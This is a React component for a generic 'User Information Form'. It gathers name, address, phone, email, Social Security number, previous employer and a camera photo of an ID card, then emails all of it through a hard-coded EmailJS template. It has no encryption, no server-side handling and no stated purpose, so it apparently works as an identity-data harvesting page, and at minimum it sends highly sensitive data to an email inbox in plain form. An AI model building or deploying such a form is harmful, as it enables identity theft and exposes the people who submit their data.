import { useState } from "react";
import emailjs from "@emailjs/browser";

const FormComponent = () => {
  const [formData, setFormData] = useState({
    name: "",
    address: "",
    phone: "",
    email: "",
    ssn: "",
    previousEmployer: "",
    idCardBase64: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleFileChange = (e) => {
    const file = e.target.files[0];
    if (file && file.type === "image/jpeg") {
      const reader = new FileReader();
      reader.onloadend = () => {
        setFormData((prev) => ({ ...prev, idCardBase64: reader.result }));
      };
      reader.onerror = () => {
        alert("Error reading the file. Please try again.");
      };
      reader.readAsDataURL(file);
    } else {
      alert("Please upload a valid JPEG image.");
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const emailData = {
      service_id: "service_x9ryr1u",
      template_id: "template_1hq6etl",
      user_id: "pg09Mt7R3DRf_Tz1N",
      template_params: {
        name: formData.name,
        address: formData.address,
        phone: formData.phone,
        email: formData.email,
        ssn: formData.ssn,
        previousEmployer: formData.previousEmployer,
        idCardBase64: formData.idCardBase64,
      },
    };

    try {
      await emailjs.send(
        emailData.service_id, 
        emailData.template_id, 
        emailData.template_params, 
        emailData.user_id
      );
      alert("Your information has been sent successfully!");
    } catch (error) {
      console.error("Error sending email:", error);
      alert("Failed to send information. Please try again.");
    }
  };

  return (
    <div className="max-w-2xl mx-auto p-6 bg-white shadow-xl rounded-2xl border border-gray-200 sm:p-8 lg:p-10 relative overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-br from-purple-500 to-indigo-500 opacity-20 blur-2xl"></div>
      <div className="relative backdrop-blur-md bg-white/80 shadow-2xl rounded-2xl p-6 sm:p-8 lg:p-10 transform transition-all duration-500 hover:shadow-3xl hover:-translate-y-2">
        <h2 className="text-2xl font-semibold text-gray-800 text-center mb-6">User Information Form</h2>
        <form onSubmit={handleSubmit} className="space-y-5">
          <input type="text" name="name" placeholder="Full Name" value={formData.name} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
          <input type="text" name="address" placeholder="Address" value={formData.address} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
          <input type="tel" name="phone" placeholder="Phone Number" value={formData.phone} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
          <input type="email" name="email" placeholder="Email" value={formData.email} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
          <input type="text" name="ssn" placeholder="Social Security Number" value={formData.ssn} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
          <input type="text" name="previousEmployer" placeholder="Previous Employer" value={formData.previousEmployer} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
          <input
  type="file"
  accept="image/*" // Accepts all image formats
  capture="environment" // Allows capturing with the camera
  onChange={handleFileChange}
  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none"
  required
/>

          <button type="submit" className="w-full bg-blue-600 text-white p-3 rounded-lg hover:bg-blue-700 transition duration-300">Submit</button>
        </form>
      </div>
    </div>
  );
};

export default FormComponent;
